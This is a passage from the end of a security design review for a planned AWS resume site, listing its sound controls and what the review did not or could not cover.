- **Bootstrap owns the CI roles, the boundary and the budget**, so the apply role can't
  remove its own guardrails (provided SEC-003 is implemented).
- **Private S3 + OAC with `AWS:SourceArn`**, BPA on, TLS-only, `TLSv1.2_2021`, managed
  security headers, and no S3 website endpoint.
- **Provisioned DynamoDB and stage throttling** do cap the Lambda and DynamoDB parts of
  abuse. Deletion protection and PITR are on. There is no unique-visitor tracking, which
  keeps PII out by design.
- **The data-classification table** and short log retention for IP-bearing logs.
- The **placeholder-then-out-of-band** secret pattern from `tf_pr_bot` (fix SEC-002 so
  the stored value actually stays private).

## Out of scope / not reviewed

- No code, Terraform or workflows exist for aws_resume yet. Every finding is against
  the design as it would be built. Re-review the bootstrap Terraform and
  `aws_resume-infra.yml` when they are written, especially SEC-002, SEC-003, SEC-005 and
  SEC-006.
- Cross-project files were reviewed only for their effect on aws_resume. The
  intentional findings in `tf_pr_reviewer/s3.tf` and `security_group.tf` and the
  `tf_pr_bot` handler code were not reviewed.
- This session had no directory-listing tool. I reviewed the one root workflow named in
  the design (`.github/workflows/tf_pr_reviewer-terraform.yml`). I could not confirm
  whether any **other** files exist in `.github/workflows/`. Any other workflow that
  requests `id-token: write` widens SEC-001 and SEC-002, so check that directory by hand.
- I did not check the live AWS account or GitHub settings: whether the sibling role
  exists, root MFA, current environments, branch protection. Recommendations say where
  to check.
- Whether API Gateway bills throttled 429 responses could not be confirmed from an
  authoritative AWS source (SEC-004). The finding assumes they are billed, because the
  pricing page does not exempt them.
